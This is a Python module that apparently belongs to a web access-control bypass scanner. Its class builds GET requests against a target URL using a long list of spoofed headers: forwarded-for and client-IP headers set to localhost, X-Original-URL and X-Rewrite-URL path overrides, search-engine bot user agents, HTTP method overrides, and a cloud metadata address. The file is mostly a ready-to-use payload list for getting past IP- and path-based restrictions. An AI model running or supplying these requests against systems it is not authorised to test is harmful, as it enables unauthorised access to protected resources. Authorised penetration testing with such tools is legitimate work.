#!/usr/bin/env python3
"""
Header-based bypass techniques
"""

import urllib.parse

class HeaderBypass:
    def __init__(self, manager):
        self.manager = manager
        
    def get_tests(self):
        """Generate header-based bypass tests"""
        tests = []
        base_url = self.manager.target_url
        
        # Common bypass headers
        bypass_headers = [
            # X-Forwarded-* headers
            {'X-Forwarded-For': '127.0.0.1'},
            {'X-Forwarded-For': 'localhost'},
            {'X-Forwarded-For': '0.0.0.0'},
            {'X-Forwarded-For': '::1'},
            {'X-Forwarded-Host': 'localhost'},
            {'X-Forwarded-Host': '127.0.0.1'},
            
            # Client-IP headers
            {'Client-IP': '127.0.0.1'},
            {'X-Client-IP': '127.0.0.1'},
            {'X-Real-IP': '127.0.0.1'},
            {'X-Originating-IP': '127.0.0.1'},
            {'X-Remote-IP': '127.0.0.1'},
            {'X-Remote-Addr': '127.0.0.1'},
            
            # Host headers
            {'Host': 'localhost'},
            {'Host': '127.0.0.1'},
            {'Host': '0.0.0.0'},
            {'X-Original-Host': 'localhost'},
            {'X-Forwarded-Server': 'localhost'},
            
            # Authentication bypass
            {'X-Original-URL': '/' + urllib.parse.urlparse(base_url).path},
            {'X-Rewrite-URL': '/' + urllib.parse.urlparse(base_url).path},
            {'X-Override-URL': '/' + urllib.parse.urlparse(base_url).path},
            
            # Custom headers
            {'X-Custom-IP-Authorization': '127.0.0.1'},
            {'X-ProxyUser-Ip': '127.0.0.1'},
            {'X-User-IP': '127.0.0.1'},
            {'X-Forwarded-For': '127.0.0.1, 127.0.0.2'},
            
            # Referer bypass
            {'Referer': 'https://google.com'},
            {'Referer': 'https://' + urllib.parse.urlparse(base_url).netloc},
            {'Referer': base_url},
            
            # User-Agent bypass
            {'User-Agent': 'Googlebot/2.1 (+http://www.google.com/bot.html)'},
            {'User-Agent': 'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)'},
            {'User-Agent': 'Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)'},
            
            # Content-Type bypass
            {'Content-Type': 'application/x-www-form-urlencoded'},
            {'Content-Type': 'multipart/form-data'},
            
            # Cache bypass
            {'Cache-Control': 'no-cache'},
            {'Pragma': 'no-cache'},
            
            # Range bypass
            {'Range': 'bytes=0-1024'},
            {'If-Range': 'bytes=0-1024'},
            
            # Accept encoding bypass
            {'Accept-Encoding': 'gzip, deflate, br'},
            {'Accept-Encoding': 'identity'},
            
            # Connection header
            {'Connection': 'close'},
            {'Connection': 'keep-alive'},
            
            # Security headers
            {'X-Forwarded-Proto': 'http'},
            {'X-Forwarded-Proto': 'https'},
            {'X-Forwarded-Scheme': 'http'},
            {'X-Forwarded-Scheme': 'https'},
            
            # Origin bypass
            {'Origin': base_url},
            {'Origin': 'null'},
            
            # Additional bypass headers
            {'X-HTTP-Method-Override': 'GET'},
            {'X-HTTP-Method-Override': 'POST'},
            {'X-HTTP-Method-Override': 'PUT'},
            {'X-HTTP-Method-Override': 'DELETE'},
            
            {'X-Method-Override': 'GET'},
            {'X-Method-Override': 'POST'},
            
            {'_method': 'GET'},
            {'_method': 'POST'},
            
            # Cloudflare bypass
            {'CF-Connecting-IP': '127.0.0.1'},
            {'CF-IPCountry': 'US'},
            {'X-Forwarded-For': '127.0.0.1, 192.168.1.1'},
            
            # AWS bypass
            {'X-Forwarded-For': '127.0.0.1, 10.0.0.1'},
            
            # GCP bypass
            {'X-Forwarded-For': '127.0.0.1, 169.254.169.254'},
        ]
        
        # Add tests with header combinations
        for headers in bypass_headers:
            tests.append({
                'name': f'Header Bypass: {list(headers.keys())[0]}={list(headers.values())[0]}',
                'url': base_url,
                'headers': headers,
                'method': 'GET'
            })
        
        # Test with path after header injection
        for headers in bypass_headers:
            tests.append({
                'name': f'Header + Path: {list(headers.keys())[0]}={list(headers.values())[0]}',
                'url': base_url + '?test=' + urllib.parse.quote(str(list(headers.values())[0])),
                'headers': headers,
                'method': 'GET'
            })
        
        return tests
